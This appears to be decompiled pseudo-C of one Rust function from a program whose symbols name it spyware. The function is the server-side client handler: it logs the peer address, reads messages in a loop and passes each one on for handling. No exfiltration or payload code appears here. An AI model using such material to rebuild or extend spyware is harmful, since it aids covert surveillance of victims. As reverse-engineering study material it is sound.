undefined8 _ZN7spyware13communication6server13handle_client17hb99b66a85b0a9c88E(int param_1)

{
  ulong uVar1;
  long lVar2;
  undefined8 uVar3;
  int local_f4;
  undefined8 local_f0;
  undefined8 local_e8;
  undefined8 uStack_e0;
  undefined8 local_d8;
  undefined8 uStack_d0;
  undefined8 local_c8;
  undefined4 uStack_c0;
  undefined4 uStack_bc;
  undefined4 local_b8;
  undefined4 uStack_b4;
  undefined4 uStack_b0;
  undefined4 uStack_ac;
  undefined **local_a8;
  undefined8 uStack_a0;
  short **local_98;
  undefined8 uStack_90;
  undefined8 uStack_88;
  undefined4 uStack_80;
  undefined4 uStack_7c;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  short *local_68;
  undefined *local_60;
  short local_58;
  undefined4 uStack_56;
  undefined2 uStack_52;
  undefined8 uStack_50;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 local_38;
  undefined4 uStack_34;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined4 local_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  local_f4 = param_1;
  uVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (3 < uVar1) {
                    /* try { // try from 0014cd4b to 0014ce4d has its CatchHandler @ 0014d01d */
    (*(code *)PTR__ZN3std3net3tcp9TcpStream9peer_addr17h9ccf6949693ba95cE_001be628)
              (&local_e8,&local_f4);
    uVar3 = uStack_e0;
    if ((short)local_e8 == 2) goto LAB_0014d008;
    uStack_52 = local_e8._6_2_;
    uStack_56 = local_e8._2_4_;
    local_18 = (undefined4)local_d8;
    uStack_14 = local_d8._4_4_;
    uStack_10 = (undefined4)uStack_d0;
    uStack_c = uStack_d0._4_4_;
    local_58 = (short)local_e8;
    uStack_50 = uStack_e0;
    local_48 = (undefined4)local_d8;
    uStack_44 = local_d8._4_4_;
    uStack_40 = (undefined4)uStack_d0;
    uStack_3c = uStack_d0._4_4_;
    local_68 = &local_58;
    local_60 = 
    PTR__ZN73__LT_core__net__socket_addr__SocketAddr_u20_as_u20_core__fmt__Display_GT_3fmt17hb8f0b665671134daE_001be630
    ;
    local_a8 = &PTR_DAT_001b8c30;
    uStack_a0 = 1;
    uStack_88 = 0;
    local_98 = &local_68;
    uStack_90 = 1;
    local_c8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_DAT_001b8c70);
    local_e8 = (undefined **)&DAT_001120dc;
    uStack_e0 = 0x1e;
    local_d8 = (short **)&DAT_001120dc;
    uStack_d0 = 0x1e;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_a8,4,&local_e8);
  }
                    /* try { // try from 0014ce50 to 0014ce61 has its CatchHandler @ 0014d045 */
  while (_ZN7spyware13communication6server11get_message17hbc00a55f19d841bbE(&local_58,&local_f4),
        uVar3 = uStack_50, CONCAT26(uStack_52,CONCAT42(uStack_56,local_58)) != -0x7ffffffffffffff6)
  {
    local_e8 = (undefined **)CONCAT26(uStack_52,CONCAT42(uStack_56,local_58));
    local_b8 = local_28;
    uStack_b4 = uStack_24;
    uStack_b0 = uStack_20;
    uStack_ac = uStack_1c;
    local_c8 = CONCAT44(uStack_34,local_38);
    uStack_c0 = uStack_30;
    uStack_bc = uStack_2c;
    local_d8 = (short **)CONCAT44(uStack_44,local_48);
    uStack_d0 = CONCAT44(uStack_3c,uStack_40);
    uStack_e0 = uStack_50;
    local_a8 = &PTR_DAT_001b8c50;
    uStack_a0 = 1;
    local_98 = (short **)0x8;
    uStack_90 = 0;
    uStack_88 = 0;
                    /* try { // try from 0014ced4 to 0014cede has its CatchHandler @ 0014d02e */
    (*(code *)PTR__ZN3std2io5stdio6_print17h17d6c2a1d6a6f99eE_001be648)(&local_a8);
    local_78 = local_b8;
    uStack_74 = uStack_b4;
    uStack_70 = uStack_b0;
    uStack_6c = uStack_ac;
    uStack_88 = local_c8;
    uStack_80 = uStack_c0;
    uStack_7c = uStack_bc;
    local_98 = local_d8;
    uStack_90 = uStack_d0;
    local_a8 = local_e8;
    uStack_a0 = uStack_e0;
                    /* try { // try from 0014cf0a to 0014cf18 has its CatchHandler @ 0014d043 */
    _ZN7spyware13communication6server14handle_message17h02435bd595e8370dE(&local_a8,&local_f4);
  }
  local_f0 = uStack_50;
  local_a8 = &PTR_DAT_001b8c40;
  uStack_a0 = 1;
  local_98 = (short **)&DAT_00000008;
  uStack_90 = 0;
  uStack_88 = 0;
                    /* try { // try from 0014cf51 to 0014d002 has its CatchHandler @ 0014d01f */
  (*(code *)PTR__ZN3std2io5stdio6_print17h17d6c2a1d6a6f99eE_001be648)(&local_a8);
  lVar2 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (lVar2 != 0) {
    local_68 = (short *)&local_f0;
    local_60 = 
    PTR__ZN60__LT_std__io__error__Error_u20_as_u20_core__fmt__Display_GT_3fmt17hcf0c0103019d8a0aE_001be638
    ;
    local_a8 = &PTR_DAT_001b8c60;
    uStack_a0 = 1;
    uStack_88 = 0;
    local_98 = &local_68;
    uStack_90 = 1;
    local_c8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_DAT_001b8c88);
    local_e8 = (undefined **)&DAT_001120dc;
    uStack_e0 = 0x1e;
    local_d8 = (short **)&DAT_001120dc;
    uStack_d0 = 0x1e;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_a8,1,&local_e8);
    uVar3 = local_f0;
  }
LAB_0014d008:
  _ZN4core3ptr45drop_in_place_LT_std__net__tcp__TcpStream_GT_17hf7372bfdd8ef8cfeE(local_f4);
  return uVar3;
}